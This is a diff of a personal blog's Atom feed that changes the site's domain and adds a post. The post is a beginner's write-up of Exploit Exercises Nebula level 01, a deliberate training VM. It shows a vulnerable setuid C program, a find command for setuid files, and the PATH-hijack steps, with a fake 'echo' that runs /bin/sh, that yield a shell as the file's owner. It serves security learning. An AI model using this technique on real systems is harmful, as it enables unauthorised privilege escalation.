@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
  <title>Álvaro</title>
- <link href="http://www.alvarofe.com/atom.xml" rel="self"/>
- <link href="http://www.alvarofe.com/"/>
- <updated>2014-12-10T20:44:59+01:00</updated>
- <id>http://www.alvarofe.com</id>
+ <link href="http://alvarofe.github.io/atom.xml" rel="self"/>
+ <link href="http://alvarofe.github.io/"/>
+ <updated>2014-12-10T23:22:32+01:00</updated>
+ <id>http://alvarofe.github.io</id>
  <author>
    <name>Álvaro Felipe Melchor</name>
    <email></email>
@@ -14,10 +14,13 @@
  
  <entry>
    <title>Nebula Level 01</title>
-   <link href="http://www.alvarofe.com/posts/nebulalevel01"/>
-   <updated>2009-06-30T17:14:29+02:00</updated>
-   <id>http://www.alvarofe.com/posts/nebulalevel01</id>
-   <content type="html">&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
+   <link href="http://alvarofe.github.io/posts/nebulalevel01"/>
+   <updated>2014-12-10T00:00:00+01:00</updated>
+   <id>http://alvarofe.github.io/posts/nebulalevel01</id>
+   <content type="html">&lt;p&gt;I’ve been reading about security these months ago. I really enjoy learning each day but I think that sometimes is to much theory and I felt the necessity to start practice and gain more confidence about what I was reading. Please you do not misunderstand me, I think that theory plays a main role in security but in the process of learning the practice give you more sight about everything.&lt;/p&gt;
+
+&lt;p&gt;Yesterday I downloaded the first virtual machine from &lt;a href=&quot;https://exploit-exercises.com&quot;&gt;Exploit Exercises&lt;/a&gt;. The second exercise show you the next snippet and it encourages you to try find out the vulnerability . &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
@@ -34,7 +37,26 @@
   &lt;span class=&quot;n&quot;&gt;setresuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
   &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;/usr/bin/env echo and now what?&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Basically the &lt;code&gt;setresgid&lt;/code&gt; and &lt;code&gt;setresuid&lt;/code&gt; set the program to run with the owner’s permission. These functions have some kind of nuances depending in the system where they are executed. I encourage to read the following &lt;a href=&quot;https://www.usenix.org/legacy/event/sec02/full_papers/chen/chen.pdf&quot;&gt;paper&lt;/a&gt; to understand it better. Perhaps in other post I will write about them, because thanks to the book &lt;a href=&quot;http://www.amazon.es/The-Software-Security-Assessment-Vulnerabilities/dp/0321444426&quot;&gt;The Art of Software Security Assessment&lt;/a&gt; I have learned a little bit about their nuances. In this case the file has an user &lt;code&gt;flag01&lt;/code&gt; since if in the terminal we execute we observe.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find . -type f -perm +6000 -ls 2&amp;gt; /dev/null
+&lt;span class=&quot;m&quot;&gt;12962&lt;/span&gt;    &lt;span class=&quot;m&quot;&gt;8&lt;/span&gt; -rwsr-x---   &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; flag01   level01      &lt;span class=&quot;m&quot;&gt;7322&lt;/span&gt; Nov &lt;span class=&quot;m&quot;&gt;20&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;2011&lt;/span&gt; ./flag01
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;It is a suid program. It Sets the Real, Effective and Saved UIDs the same as the Effective UID. This is so that the SUID process is now effectively running as if called by the owner &lt;code&gt;flag01&lt;/code&gt;. The main issue with this snippet is when it calls &lt;code&gt;echo&lt;/code&gt; without specifying the absolute path or using &lt;code&gt;/usr/bin/env&lt;/code&gt; because otherwise it would have execute the built-in echo. But how it uses&lt;code&gt;/usr/bin/env&lt;/code&gt; it will try to find the echo executable in the variable $PATH. However $PATH is controlled by us, so we could trick the program to use another malicious echo binary. It would be enough to do the next to get a shell.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt; &amp;gt; /path/echo
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod +x /path/echo
+&lt;span class=&quot;nv&quot;&gt;$ PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/path/:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./flag01
+sh-4.2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I know that maybe this exercise is easy but as always we have to start from the beginning and never stop to grow. &lt;/p&gt;
+
+&lt;p&gt;If you liked this post, you can
+&lt;a href=&quot;https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel01&amp;text=Nebula Level 01&amp;via=alvaro_fe&quot;&gt;share it with your followers&lt;/a&gt; 
+or
+&lt;a href=&quot;https://twitter.com/joshualande&quot;&gt; follow me on Twitter&lt;/a&gt;!&lt;/p&gt;
+</content>
  </entry>
  
 
